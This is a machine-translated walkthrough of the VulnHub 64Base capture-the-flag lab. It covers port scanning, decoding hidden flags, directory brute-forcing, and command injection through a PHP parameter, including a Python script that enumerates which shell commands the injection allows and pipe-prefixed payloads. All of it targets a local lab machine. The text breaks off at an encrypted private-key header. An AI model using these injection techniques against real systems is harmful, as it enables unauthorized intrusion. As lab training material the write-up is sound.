<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>VulnHub 64Base Simple Solution: Boot2Root</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Most recently, VulnHub published a new virtual image called 64Base Boot2Root . Tasks, as well as the article are designed for beginners. So do not be ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>VulnHub 64Base Simple Solution: Boot2Root</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/files/208/56a/94c/20856a94c4d3448cab41b28e6b709875.png"><br><br>  Most recently, <a href="https://www.vulnhub.com/">VulnHub</a> published a new <a href="https://www.vulnhub.com/">virtual</a> image called <a href="https://www.vulnhub.com/entry/64base-101,173/">64Base Boot2Root</a> .  Tasks, as well as the article are designed for beginners.  So do not be surprised if some of the solutions seem too simple. <br><a name="habracut"></a><br><h3>  Let's start </h3><br>  In the description we see the number of flags, and their format: <br><blockquote>  There are 6 flags to collect.  In flag Each 1 Each = = </blockquote><br>  Download the image, import the settings, open the properties of the virtual machine, in the Network section, set the network bridge to our adapter, save, run.  And then we look for our virtual machine with nmap: <br><br><pre><code class="bash hljs">sudo nmap -A 192.168.1.1-255 -p1-65535</code> </pre> <br>  We get the following output: 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <pre> <code class="hljs vhdl">Starting Nmap <span class="hljs-number"><span class="hljs-number">7.01</span></span> ( https://nmap.org ) at <span class="hljs-number"><span class="hljs-number">2016</span></span>-<span class="hljs-number"><span class="hljs-number">12</span></span>-<span class="hljs-number"><span class="hljs-number">12</span></span> <span class="hljs-number"><span class="hljs-number">22</span></span>:<span class="hljs-number"><span class="hljs-number">13</span></span> MSK Nmap scan <span class="hljs-keyword"><span class="hljs-keyword">report</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> <span class="hljs-number"><span class="hljs-number">192.168</span></span>.<span class="hljs-number"><span class="hljs-number">1.2</span></span> Host <span class="hljs-keyword"><span class="hljs-keyword">is</span></span> up (<span class="hljs-number"><span class="hljs-number">0.0040</span></span>s latency). <span class="hljs-keyword"><span class="hljs-keyword">Not</span></span> shown: <span class="hljs-number"><span class="hljs-number">997</span></span> closed ports <span class="hljs-keyword"><span class="hljs-keyword">PORT</span></span> STATE SERVICE <span class="hljs-number"><span class="hljs-number">22</span></span>/tcp <span class="hljs-keyword"><span class="hljs-keyword">open</span></span> ssh <span class="hljs-number"><span class="hljs-number">80</span></span>/tcp <span class="hljs-keyword"><span class="hljs-keyword">open</span></span> http Apache httpd <span class="hljs-number"><span class="hljs-number">2.4</span></span>.<span class="hljs-number"><span class="hljs-number">10</span></span> ((Debian)) <span class="hljs-number"><span class="hljs-number">4899</span></span>/tcp <span class="hljs-keyword"><span class="hljs-keyword">open</span></span> radmin <span class="hljs-number"><span class="hljs-number">62964</span></span>/tcp <span class="hljs-keyword"><span class="hljs-keyword">open</span></span> ssh OpenSSH <span class="hljs-number"><span class="hljs-number">6.7</span></span>p1 Debian <span class="hljs-number"><span class="hljs-number">5</span></span>+deb8u3 (protocol <span class="hljs-number"><span class="hljs-number">2.0</span></span>) MAC Address: <span class="hljs-number"><span class="hljs-number">08</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">27</span></span>:<span class="hljs-number"><span class="hljs-number">68</span></span>:E7:F8 (Oracle VirtualBox virtual NIC)</code> </pre> <br>  2 of 4 ports were successfully detected - these are 80 and 62964, and 2 ports that were not defined by nmap.  But about them later. <br><br><h3>  flag1 </h3><br>  Go to the address <a href="http://192.168.1.2/">192.168.1.2</a> : 80, we get to the main page. <br><br><img src="https://habrastorage.org/files/ea9/9e1/a30/ea99e1a308064b7db0a313f57772129b.png"><br><br>  On which the inscription rushes to eyes: <i>dmlldyBzb3VyY2UgO0QK</i> <br><br>  Decode it from Base64 and get a hint: <i>view source; D</i> <br><br>  Ok, let's look at the page code, and next to this label we see the comment: <br><br><pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">class</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"site-heading"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">h1</span></span></span><span class="hljs-tag">&gt;</span></span>64base<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">h1</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">hr</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">class</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"small"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">span</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">class</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"subheading"</span></span></span><span class="hljs-tag">&gt;</span></span>dmlldyBzb3VyY2UgO0QK<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">span</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-comment"><span class="hljs-comment">&lt;!--5a6d78685a7a4637546d705361566c59546d785062464a7654587056656c464953587055616b4a56576b644752574e7151586853534842575555684b6246524551586454656b5a77596d316a4d454e6e5054313943673d3d0a--&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  After conversion HEX ‚Üí ASCII ‚Üí Base64 ‚Üí ASCII <br><br>  We get the first flag: <br><br><blockquote>  flag1 {NjRiYXNlOlRoMzUzQHIzTjBUZGFEcjAxRHpVQHJlTDAwSzFpbmc0Cg ==} </blockquote><br>  After trying to convert the flag from base64 to ASCII, you can get credentials <br><blockquote>  64base: Th353 @ r3N0TdaDr01DzU @ reL00K1ing4 </blockquote><br><h3>  flag2 </h3><br>  And so, we have a username and an intended password.  Search for available files and directories: <br><br><pre> <code class="bash hljs">sudo dirsearch -r -u http://192.168.1.2 -e php,txt,bak -w /usr/share/dirb/wordlists/big.txt -f -x 301,403</code> </pre> <br><img src="https://habrastorage.org/files/9ff/f7f/d97/9fff7fd979054d1e8fe0b229145bbc89.png"><br><br>  Found a page with Basic authorization <i>/ admin</i> .  The credentials found in the past flag did not match.  On ssh with them, too, could not connect.  Apparently something was missing.  After a brief search, it was decided to parse the words from the pages of the site into a separate dictionary.  The Python script helped with this: <br><br><div class="spoiler">  <b class="spoiler_title">Hidden text</b> <div class="spoiler_text"><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/python3 import re import requests import sys def repl(txt): txt = txt.replace('&lt;!', ' ').replace('&gt;', ' ').replace('&lt;/', ' ').replace('\n', ' ').replace('&lt;', ' ').replace('"', ' ').replace('=', ' ').replace(':', ' ').replace('--', ' ').replace('/', ' ').replace("'", " ").replace('¬©', ' ').replace(',', ' ').replace('#', ' ').replace('‚Üía', ' ').replace('?', ' ').replace('.', ' ').replace(';', ' ').replace('(', ' ').replace(')', ' ').replace('{', ' ').replace('}', ' ') return txt.strip() words = [] url = sys.argv[1] req = requests.get(url).text.splitlines() for item in req: item = repl(item) tmp = [x.strip() for x in item.split(' ') if x.strip() != ''] for word in tmp: if word not in words: words.append(word) w = open(sys.argv[2], 'w') for x in words: w.write('%s\n' %(x)) w.close()</span></span></code> </pre> <br>  Perform it for each page we found: <br><br><pre> <code class="bash hljs">./parser.py http://192.168.1.2/index.html index ./parser.py http://192.168.1.2/about.html about ./parser.py http://192.168.1.2/post.html post ./parser.py http://192.168.1.2/contact.html contact cat index about post contact | sort -u &gt; words.lst</code> </pre> <br>  Run the directory search again: <br><br><pre> <code class="bash hljs">sudo dirsearch -u http://192.168.1.2/ -r -f -w words.lst -e php,txt,json,bak -x 301</code> </pre> <br></div></div><br><img src="https://habrastorage.org/files/fd1/42f/de7/fd142fde74fd4defa52162e62066bd3c.png"><br><br>  Found another interesting directory.  If you look at the <i>robots.txt</i> file, you can find the entry: <br><br><blockquote>  Disallow: / Imperial-class / </blockquote><br>  Apparently this is one of the author's jokes, which were mentioned in the description.  During the transition, authorization is requested, we enter the login and password received earlier, and we are logged in! <br><br>  However, rejoice too early, we were greeted by the message: <br><br><blockquote>  [] ERROR: incorrect path! .. TO THE DARK SIDE! </blockquote><br>  Searching on the site <i>Imperial-lass</i> , we find the phrase: <br><blockquote>  If you are a real Imperial-Class BountyHunter </blockquote><br>  Hmm, trying to go to the address <i><a href="http://192.168.1.2/Imperial-Class/BountyHunter/">192.168.1.2/Imperial-Class/BountyHunter</a></i> we get to the next login page: <br><br><img src="https://habrastorage.org/files/c43/7a4/008/c437a40085c34baa9898acf524c17bd5.jpg"><br><br>  Looking at the source code, we see the following: <br><br><div class="spoiler">  <b class="spoiler_title">Another coded flag</b> <div class="spoiler_text"><pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">bgcolor</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">#000000</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">font</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">color</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">#cfbf00</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">form</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"login-form"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"login-form"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">method</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"post"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">action</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"./login.php"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">fieldset</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">legend</span></span></span><span class="hljs-tag">&gt;</span></span>Please login:<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">legend</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">dl</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">dt</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">label</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">title</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Username"</span></span></span><span class="hljs-tag">&gt;</span></span>Username: <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">tabindex</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"1"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">accesskey</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"u"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"function"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"text"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">maxlength</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"50"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"5a6d78685a7a4a37595568534d474e4954545a4d65546b7a5a444e6a645756"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">label</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">dt</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">dl</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">dl</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">dt</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">label</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">title</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Password"</span></span></span><span class="hljs-tag">&gt;</span></span>Password: <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">tabindex</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"2"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">accesskey</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"p"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"command"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"password"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">maxlength</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"15"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"584f54466b53465a70576c4d31616d49794d485a6b4d6b597757544a6e4c32"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">label</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">dt</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">dl</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">dl</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">dt</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">label</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">title</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Submit"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">tabindex</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"3"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">accesskey</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"l"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"submit"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"cmdlogin"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Login"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-comment"><span class="hljs-comment">&lt;!-- basictoken=52714d544a54626d51315a45566157464655614446525557383966516f3d0a --&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">label</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">dt</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">dl</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">fieldset</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">form</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br></div></div><br>  We combine, transform HEX -&gt; TEXT -&gt; Base64 -&gt; TEXT, we get the second flag: <br><blockquote>  flag2 {aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g / dj12Snd5dEZXQTh1QQo =} </blockquote><br>  this time, the <a href="https://www.youtube.com/watch%3Fv%3DvJwytFWA8uA">YouTube</a> link is encoded in the flag instead of the hint <a href="https://www.youtube.com/watch%3Fv%3DvJwytFWA8uA">.</a> <br><br><h3>  flag3 </h3><br>  Let's continue, we have an authorization form: <i><a href="http://192.168.1.2/Imperial-Class/BountyHunter/index.php">192.168.1.2/Imperial-Class/BountyHunter/index.php</a></i> , having tried several options, you can see that whenever you send a POST request to <i>login.php</i> , we redirect to <i>index.php</i> without any errors . <br><br>  Let's take a closer look at the redirect process using <i>curl</i> : <br><br><pre> <code class="bash hljs">curl http://192.168.1.2/Imperial-Class/BountyHunter/login.php -H <span class="hljs-string"><span class="hljs-string">'Authorization: Basic NjRiYXNlOlRoMzUzQHIzTjBUZGFEcjAxRHpVQHJlTDAwSzFpbmc0'</span></span></code> </pre> <br>  In response to surprise, we received the following flag: <br><br><blockquote>  flag3 {NTNjcjN0NWgzNzcvSW1wZXJpYWwtQ2xhc3MvQm91bnR5SHVudGVyL2xvZ2 <br>  luLnBocD9mPWV4ZWMmYz1pZAo =} </blockquote><br>  And the new hint encoded in it: <br><br><blockquote>  53cr3t5h377 / Imperial-Class / BountyHunter / login.php? F = exec &amp; c = id </blockquote><br><h3>  flag4 </h3><br>  Use the Clue from the previous flag and go to <i><a href="http://192.168.1.2/Imperial-Class/BountyHunter/login.php%3Ff%3Dexec%26c%3Did">192.168.1.2/Imperial-Class/BountyHunter/login.php?f=exec&amp;c=id</a></i> <br><br><img src="https://habrastorage.org/files/ef7/7ea/4ce/ef77ea4cef4247b48543a2c2348e21dc.png"><br><br>  Hmm, just remember the picture, from the page <i>post.html</i> <br><br><div class="spoiler">  <b class="spoiler_title">Picture</b> <div class="spoiler_text"><img src="https://habrastorage.org/files/02a/4e5/7b7/02a4e57b7dbb407593390559de6a9ebd.jpg"><br></div></div><br>  Let's replace EXEC with SYSTEM: <i><a href="http://192.168.1.2/Imperial-Class/BountyHunter/login.php%3Ff%3Dsystem%26c%3Did">192.168.1.2/Imperial-Class/BountyHunter/login.php?f=system&amp;c=id</a></i> And we get a new flag, a hint, as well as a shell on a virtual machine. <br><br><img src="https://habrastorage.org/files/734/49a/410/73449a4103c943c7939d838af682a791.png"><br><br><blockquote>  flag4 {NjRiYXNlOjY0YmFzZTVoMzc3Cg ==} </blockquote><br>  In the tooltip, we find new credentials: <i>64base: 64base5h377</i> <br><br><h3>  flag5 </h3><br>  Having studied the possibilities of the found shel a little, it becomes clear that the list of commands available for execution is very limited, in addition there is a filter for the slash.  It remains to determine which of them are available to us. <br><br>  Let's create a dictionary to iterate through the commands available to us: <br><br><pre> <code class="bash hljs"><span class="hljs-keyword"><span class="hljs-keyword">for</span></span> item <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> $(ls /usr/sbin/ &amp;&amp; ls /usr/bin/ &amp;&amp; ls /sbin/ &amp;&amp; ls /bin/); <span class="hljs-keyword"><span class="hljs-keyword">do</span></span> <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-variable"><span class="hljs-variable">$item</span></span> &gt;&gt; /tmp/unix_command2.lst; <span class="hljs-keyword"><span class="hljs-keyword">done</span></span> sort -u /tmp/unix_command2.lst &gt; unix_command.lst</code> </pre> <br>  Then we feed this dictionary to the Python script: <br><br><div class="spoiler">  <b class="spoiler_title">Code</b> <div class="spoiler_text"><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/python import requests import sys, re url = 'http://192.168.1.2/Imperial-Class/BountyHunter/login.php' param = {'f':'system', 'c':''} basic = ('64base', 'Th353@r3N0TdaDr01DzU@reL00K1ing4') if len(sys.argv) == 1: print('Usage: brute_sh.py [wordlist]') sys.exit(0) words = open(sys.argv[1], 'r').read().splitlines() for item in words: param['c'] = '%s --help' %(item) req = requests.get(url, params=param, auth=basic) if len(req.text.splitlines()) &gt; 9: print('Found cmd: %s' %(item))</span></span></code> </pre><br></div></div><br>  And we get the following conclusion: <br><br><blockquote>  Found cmd: base64 <br>  Found cmd: cat <br>  Found cmd: id <br>  Found cmd: locate <br>  Found cmd: ls <br>  Found cmd: nc <br>  Found cmd: ps <br>  Found cmd: w <br>  Found cmd: wget <br>  Found cmd: who <br>  Found cmd: whoami </blockquote><br>  Not much, however, since we do not filter the symbol |  then substituting it at the beginning of the command, we get the opportunity to perform any.  Having played with the transmitted parameters <br>  we receive such request: <br><br><pre> <code class="bash hljs">|locate admin|grep html|xargs find</code> </pre> <br>  <b>PS</b> Here and further, I will give the commands that need to be passed in the argument <i>c</i> . <br><br>  The output will look like this: <br><br><blockquote>  / var / www / html / admin <br>  /var/www/html/admin/index.php <br>  / var / www / html / admin / S3cR37 <br>  / var / www / html / admin / S3cR37 / flag5 {TG9vayBJbnNpZGUhIDpECg ==} <br>  /var/www/html/admin/.htaccess <br>  /var/www/html/admin/.htaccess <br>  /var/www/html/admin/index.php </blockquote><br>  The flag was found, and with it a new hint: <i>Look Inside!</i>  <i>: D</i> <br><br><h3>  flag6 </h3><br>  We are asked to look inside this file.  Ok, do this: <br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#      |locate admin|grep html|xargs find|grep TG|xargs cp -t . #   |ls|grep TG|xargs chmod 777</span></span></code> </pre> <br>  Open in the browser, the file was a picture: <br><br><img src="https://habrastorage.org/files/c88/ecd/e3b/c88ecde3bebd44ff8f8b3ee45d326952.jpeg"><br><br>  Run <i>exiftool</i> and see the metadata of this image. <br><br><div class="spoiler">  <b class="spoiler_title">Hidden text</b> <div class="spoiler_text">  ExifTool Version Number: 9.46 <br>  File Name: flag5 {TG9vayBJbnNpZGUhIDpECg ==}. Jpeg <br>  Directory :. <br>  File Size: 192 kB <br>  File Modification Date / Time: 2016: 12: 16 05: 32: 02 + 03: 00 <br>  File Access Date / Time: 2016: 12: 16 05: 32: 08 + 03: 00 <br>  File Inode Change Date / Time: 2016: 12: 16 05: 32: 02 + 03: 00 <br>  File Permissions: rw ------- <br>  File Type: JPEG <br>  MIME Type: image / jpeg <br>  JFIF Version: 1.01 <br>  Resolution Unit: inches <br>  X Resolution: 72 <br>  Y Resolution: 72 <br>  Comment: <br>  Image Width: 960 <br>  Image Height: 720 <br>  Encoding Process: Baseline DCT, Huffman coding <br>  Bits Per Sample: 8 <br>  Color Components: 3 <br>  Y Cb Cr Sub Sampling: YCbCr4: 4: 4 (1 1) <br>  Image Size: 960x720 <br></div></div><br>  Copy the contents of the <i>Comment</i> field and perform the same transformations as with the previous flags.  Instead of a flag, we were given a private RSA key: <br><br><div class="spoiler">  <b class="spoiler_title">Hidden text</b> <div class="spoiler_text">  ----- BEGIN RSA PRIVATE KEY ----- <br>  Proc-Type: 4, ENCRYPTED <br>  DEK-Info: AES-128-CBC, 621A38AAD4E9FAA3657CA3888D9B356C 